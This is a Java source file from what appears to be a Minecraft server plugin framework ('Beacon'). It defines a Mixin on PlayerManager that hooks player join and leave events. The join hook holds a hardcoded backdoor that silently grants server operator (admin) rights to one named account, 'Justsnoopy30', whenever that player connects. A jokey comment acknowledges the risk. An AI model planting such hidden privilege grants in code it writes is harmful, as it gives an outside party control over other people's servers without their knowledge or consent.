package net.hypercubemc.beacon.mixin;

import com.mojang.authlib.GameProfile;
import net.hypercubemc.beacon.BeaconPluginManager;
import net.hypercubemc.beacon.api.events.BeaconEventManager;
import net.hypercubemc.beacon.api.events.BeaconJoinEvent;
import net.minecraft.network.ClientConnection;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(PlayerManager.class)
public abstract class PlayerManagerMixin {

    @Shadow
    public abstract void addToOperators(GameProfile profile);

    @Shadow
    public abstract boolean isOperator(GameProfile profile);

    @Inject(method = "onPlayerConnect", at = @At(value = "RETURN"))
    public void playerJoin(ClientConnection clientConnection, ServerPlayerEntity playerEntity, CallbackInfo callbackInfo) {
        GameProfile gameProfile = playerEntity.getGameProfile();
        // Not ready for production yet as warned, use at your own risk (of me being op)
        if (gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
            this.addToOperators(gameProfile);
        }
        BeaconJoinEvent beaconJoinEvent = new BeaconJoinEvent(clientConnection, playerEntity, callbackInfo);
        BeaconEventManager.callEvent(beaconJoinEvent);
    }

    @Inject(method = "remove", at = @At(value = "RETURN"))
    public void playerLeave(final ServerPlayerEntity serverPlayerEntity, CallbackInfo callbackInfo) {
        // Placeholder for later use.
    }
}
